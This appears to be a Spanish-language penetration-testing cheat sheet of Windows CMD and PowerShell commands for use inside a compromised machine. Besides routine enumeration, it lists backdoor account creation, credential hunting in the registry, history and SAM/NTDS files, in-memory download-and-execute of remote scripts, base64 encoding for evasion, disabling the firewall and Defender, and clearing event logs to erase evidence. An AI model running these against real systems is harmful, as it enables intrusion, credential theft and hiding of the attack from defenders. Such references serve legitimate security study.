# Windows — Referencia de Comandos

Tags: #Windows #Comandos #CMD #PowerShell #Enumeracion #Referencia

## OBJETIVO

Referencia rápida de comandos Windows organizados por contexto de uso. Útil tanto desde CMD como desde PowerShell una vez dentro de una máquina comprometida.

---

## 1. INFORMACIÓN DEL SISTEMA

```bash
❯ systeminfo
# OS, versión, arquitectura, parches instalados (Hotfix), dominio
# Buscar parches faltantes → CVEs de privilege escalation

❯ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# Solo la info relevante del OS

❯ hostname
# Nombre de la máquina

❯ echo %COMPUTERNAME%
# Nombre del equipo desde variables de entorno

❯ wmic os get Caption,Version,BuildNumber,OSArchitecture
# Info del OS más limpia que systeminfo

❯ wmic qfe get Caption,Description,HotFixID,InstalledOn
# Parches instalados → identificar parches que faltan → PrivEsc

❯ wmic cpu get name
# Información del procesador
```

---

## 2. USUARIO Y PRIVILEGIOS

```bash
❯ whoami
# Usuario actual

❯ whoami /priv
# Privilegios del usuario
# SeImpersonatePrivilege → Potato attacks → PrivEsc a SYSTEM
# SeBackupPrivilege → leer cualquier archivo → SAM/NTDS

❯ whoami /groups
# Grupos a los que pertenece el usuario

❯ whoami /all
# Toda la info: usuario, grupos y privilegios juntos

❯ query user
# Ver usuarios logueados en el sistema actualmente

❯ echo %USERNAME%
# Nombre del usuario desde variable de entorno
```

---

## 3. USUARIOS Y GRUPOS

### Usuarios locales

```bash
❯ net user
# Todos los usuarios locales

❯ net user <usuario>
# Info detallada de un usuario específico

❯ net user omar P4ssw0rd /add
# Crear usuario local → requiere admin

❯ net user admin Password123
# Cambiar contraseña del usuario → requiere NT Authority\System local

❯ net user admin Password123 /domain
# Cambiar contraseña en el dominio → requiere permisos AD

# PowerShell
❯ Get-LocalUser
# Listar usuarios locales con más detalle

❯ Get-LocalUser | Select Name,Enabled,LastLogon
```

### Grupos locales

```bash
❯ net localgroup
# Listar todos los grupos locales

❯ net localgroup "Administrators"
# Miembros del grupo Administrators

❯ net localgroup Administrators omar /add
# Agregar usuario al grupo Administrators → backdoor

❯ net localgroup "Remote Desktop Users" omar /add
# Agregar usuario al grupo RDP

❯ net localgroup "Remote Management Users" omar /add
# Agregar usuario al grupo WinRM

# PowerShell
❯ Get-LocalGroup
❯ Get-LocalGroupMember Administrators
```

### Dominio

```bash
❯ net group /domain
# Grupos del dominio

❯ net group "Domain Admins" /domain
# Miembros del grupo Domain Admins

❯ net user /domain
# Usuarios del dominio

❯ net user <usuario> /domain
# Info de usuario de dominio
```

---

## 4. RED Y CONECTIVIDAD

```bash
❯ ipconfig
# Interfaces, IPs, gateway → buscar múltiples interfaces para pivoting

❯ ipconfig /all
# Info completa incluyendo MAC y DHCP

❯ ping -n 1 <IP>
# Verificar conectividad → TTL=64 Linux | TTL=128 Windows
# -n → número de pings (equivalente a -c en Linux)

❯ arp -a
# Tabla ARP → IPs y MACs de hosts conocidos → revelar otros hosts en la red

❯ route print
# Tabla de ruteo → subredes accesibles → pivoting

❯ route add <IP> mask 255.255.255.255 <GW>
# Agregar ruta para IP específica

❯ route add <IP> mask 255.255.255.0 <GW>
# Agregar ruta para segmento de red

❯ route delete <IP>
# Eliminar ruta

❯ netstat -ano
# Conexiones activas + puertos en escucha + PID

❯ netstat -ano | findstr LISTENING
# Solo puertos en escucha → buscar servicios internos

❯ netstat -ano | findstr :3306
# Buscar servicio específico por puerto

# PowerShell
❯ Get-NetIPAddress
❯ Get-NetRoute
```

---

## 5. PROCESOS Y SERVICIOS

```bash
❯ tasklist
# Listar procesos en ejecución

❯ tasklist /v
# Con verbose → usuario que ejecuta cada proceso

❯ tasklist /svc
# Servicios asociados a cada proceso

❯ tasklist | findstr <proceso>
# Buscar proceso específico

❯ taskkill /PID <PID> /F
# Matar proceso por PID → /F → forzar

❯ taskkill /IM <proceso.exe> /F
# Matar proceso por nombre

❯ sc query
# Estado de todos los servicios

❯ sc query <servicio>
# Estado de servicio específico

❯ sc qc <servicio>
# Configuración del servicio → ruta del ejecutable → útil para PrivEsc
# Buscar rutas con espacios sin comillas → unquoted service path

❯ wmic service list brief
# Lista de servicios con nombre y estado

# PowerShell
❯ Get-Process
❯ Get-Service
❯ Get-Service | Where-Object {$_.Status -eq "Running"}
❯ Get-WmiObject -Class win32_service | Select Name,State,PathName
# PathName → buscar rutas escribibles o sin comillas
```

---

## 6. SISTEMA DE ARCHIVOS Y BÚSQUEDA

### Navegación y listado

```bash
❯ findstr /spin /c:"password" C:\*.*
# Buscar archivos con la palabra password

❯ dir
# Listar contenido del directorio actual

❯ dir C:\Users
# Listar directorio específico

❯ dir /a
# Mostrar archivos ocultos y del sistema

❯ dir /r /s
# Listar archivos con ADS (Alternate Data Streams) ocultos

❯ dir /r /s <archivo.txt>
# Buscar archivo recursivamente

❯ dir -Force
# PowerShell → listar incluyendo ocultos

❯ cls
# Limpiar pantalla (equivalente a clear en Linux)

❯ cd PROGRA~1
# Acceder a directorios con espacios → primeros 6 caracteres
# ~2 si hay dos directorios con las mismas primeras 6 letras
```

### Leer archivos

```bash
❯ type <archivo>
# Mostrar contenido del archivo (equivalente a cat)

❯ more < archivo.txt
# Ver contenido en partes

❯ type archivo.txt | findstr "password"
# Buscar patrón en el contenido

# PowerShell
❯ Get-Content <archivo>
❯ cat <archivo>
# También funciona en PowerShell
```

### Buscar archivos y credenciales

```bash
❯ dir /s /b *pass* 2>nul
# Buscar archivos con "pass" en el nombre → recursivo

❯ dir /s /b *.config *.xml *.ini *.txt 2>nul
# Buscar archivos de configuración

❯ findstr /si "password" *.txt *.xml *.ini *.config
# Buscar "password" dentro del contenido
# /s → recursivo | /i → case insensitive

❯ findstr /si "password" C:\*.txt
# Buscar en toda la unidad C:

# PowerShell
❯ Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini | Select-String "password"
❯ Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*pass*"}
```

### Operaciones con archivos

```bash
❯ copy <origen> <destino>
❯ move <origen> <destino>
❯ del /s /q "archivo"          # Eliminar → /s recursivo | /q sin confirmación
❯ rmdir /s /q "C:\dir\"        # Eliminar directorio completo
❯ mkdir <directorio>
❯ echo "contenido" > archivo.txt
❯ echo "contenido" >> archivo.txt
```

---

## 7. HISTORIAL Y CREDENCIALES GUARDADAS

```bash
# Historial de PowerShell → muy valioso → puede tener credenciales
❯ type C:\Users\<usuario>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# PowerShell → forma más fiable
❯ Get-Content (Get-PSReadLineOption).HistorySavePath

# Credenciales guardadas en el sistema
❯ cmdkey /list
# Ver credenciales almacenadas en el credential manager

❯ runas /savecred /user:<dominio>\<usuario> cmd.exe
# Usar credenciales guardadas sin escribir contraseña

# Buscar contraseñas en el registro
❯ reg query HKLM /f password /t REG_SZ /s
❯ reg query HKCU /f password /t REG_SZ /s

# Autologon → puede tener contraseña en claro
❯ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## 8. TAREAS PROGRAMADAS Y ARRANQUE

```bash
❯ schtasks /query /fo LIST /v
# Ver todas las tareas programadas con detalle

❯ schtasks /query /fo LIST /v | findstr "Task Name\|Run As User\|Task To Run"
# Solo info relevante

# PowerShell
❯ Get-ScheduledTask
❯ Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select TaskName,TaskPath,State

# Arranque automático → persistencia o PrivEsc
❯ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
❯ reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
❯ wmic startup list full
```

---

## 9. TRANSFERENCIA DE ARCHIVOS

```bash
# Descargar desde servidor HTTP (CMD)
❯ certutil -urlcache -split -f http://<IP>/archivo.exe C:\temp\archivo.exe
# certutil → siempre disponible → muy fiable

❯ bitsadmin /transfer job http://<IP>/archivo.exe C:\temp\archivo.exe
# BITS → descarga en segundo plano

# PowerShell → descargar
❯ Invoke-WebRequest -Uri http://<IP>/archivo.exe -OutFile C:\temp\archivo.exe
❯ IWR -Uri http://<IP>/archivo.exe -OutFile C:\temp\archivo.exe
❯ (New-Object Net.WebClient).DownloadFile('http://<IP>/archivo.exe','C:\temp\archivo.exe')

# Ejecutar en memoria sin tocar disco
❯ IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')

# SMB → desde Kali: impacket-smbserver share $(pwd) -smb2support
❯ copy \\<IP_KALI>\share\archivo.exe C:\temp\
❯ net use \\<IP_KALI>\share    # Montar share SMB de Kali
```

---

## 10. EJECUCIÓN REMOTA Y LATERAL MOVEMENT

```bash
❯ runas /user:<dominio>\<usuario> cmd.exe
# Ejecutar CMD como otro usuario → pedirá contraseña

❯ runas /user:<dominio>\<usuario> /netonly powershell
# Autenticación de red como otro usuario → sesión local sin cambiar

# PowerShell remoto (WinRM)
❯ Enter-PSSession -ComputerName <hostname> -Credential <usuario>
# Shell interactiva remota

❯ Invoke-Command -ComputerName <hostname> -ScriptBlock {whoami} -Credential <usuario>
# Ejecutar comando remoto sin shell interactiva

# PsExec
❯ .\PsExec.exe \\<IP> -u <usuario> -p <password> cmd.exe
# Shell remota → SYSTEM si tienes admin

# WMI
❯ wmic /node:<IP> /user:<usuario> /password:<pass> process call create "cmd.exe /c whoami"
```

---

## 11. REGISTRO DE WINDOWS

```bash
❯ reg query <ruta>                    # Consultar clave
❯ reg add <ruta> /v <nombre> /t <tipo> /d <valor>    # Agregar valor
❯ reg delete <ruta> /v <nombre>       # Eliminar valor

# Habilitar RDP desde registro
❯ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
❯ netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

---

## 12. FIREWALL Y ANTIVIRUS

```bash
❯ netsh advfirewall show allprofiles
# Estado del firewall en todos los perfiles

❯ netsh advfirewall set allprofiles state off
# Deshabilitar firewall → requiere admin

❯ netsh advfirewall firewall add rule name="Open Port 4444" dir=in action=allow protocol=TCP localport=4444
# Abrir puerto en el firewall

❯ sc query windefend
# Estado de Windows Defender

# PowerShell → deshabilitar Defender
❯ Set-MpPreference -DisableRealtimeMonitoring $true

❯ wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName
# Ver antivirus instalado
```

---

## 13. POWERSHELL — COMANDOS ESENCIALES

```bash
# Política de ejecución
❯ Get-ExecutionPolicy
❯ Set-ExecutionPolicy Bypass -Scope Process -Force
❯ powershell -ExecutionPolicy Bypass -File script.ps1

# Ejecutar script remoto en memoria
❯ IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')

# Encoding para evadir restricciones
❯ powershell -EncodedCommand <base64_comando>

# Desde Linux → convertir comando a base64 para PowerShell
❯ echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://IP/script.ps1")' | iconv -t UTF-16LE | base64 -w 0

# Variables de entorno
❯ Get-ChildItem Env:
# Ver todas las variables de entorno

# Ejecutar .exe
❯ .\SharpHound.exe
# Ejecutar binario en PowerShell o CMD
```

---

## 14. RUTAS Y DIRECTORIOS DE REFERENCIA

### Rutas importantes

```
C:\Windows\System32\              → Binarios del sistema
C:\Windows\SysWOW64\             → Binarios 32-bit en sistemas 64-bit
C:\inetpub\wwwroot\              → Raíz web IIS → subir webshells aquí
C:\Users\<usuario>\Desktop\     → Escritorio del usuario
C:\Users\<usuario>\AppData\     → Datos de aplicaciones
C:\ProgramData\                   → Datos de programas (todos los usuarios)
C:\Program Files\                 → Programas 64-bit
C:\Program Files (x86)\          → Programas 32-bit
C:\Temp\ o C:\Windows\Temp\   → Temporales → escritura garantizada
```

### Archivos de credenciales frecuentes

```
C:\Windows\System32\config\SAM          → BD de contraseñas locales
C:\Windows\NTDS\ntds.dit                 → BD Active Directory (en DCs)
C:\Windows\System32\config\SYSTEM       → Necesario para descifrar SAM
C:\unattend.xml                            → Instalación desatendida → creds
C:\Windows\Panther\Unattend.xml         → Alternativa
%USERPROFILE%\.ssh\id_rsa               → Clave SSH privada
%APPDATA%\..\..\Local\FileZilla\     → Credenciales FileZilla
```

### Variables de entorno útiles

```
%USERNAME%        → Usuario actual
%COMPUTERNAME%    → Nombre del equipo
%USERPROFILE%     → C:\Users\<usuario>
%APPDATA%         → C:\Users\<usuario>\AppData\Roaming
%TEMP%            → Directorio temporal
%SystemRoot%      → C:\Windows
%PATH%            → Rutas del PATH
%LOGONSERVER%     → Servidor de autenticación (DC)
```

---

## 15. LIMPIEZA DE EVIDENCIA

```bash
❯ del /f /q archivo.exe
# Eliminar archivo sin confirmación

❯ rmdir /s /q C:\temp\
# Eliminar directorio completo

❯ wevtutil cl System
❯ wevtutil cl Security
❯ wevtutil cl Application
# Limpiar logs de eventos

❯ wevtutil el
# Listar todos los logs disponibles

# PowerShell
❯ Clear-EventLog -LogName Security,System,Application
❯ Remove-Item (Get-PSReadLineOption).HistorySavePath
# Borrar historial de PowerShell
```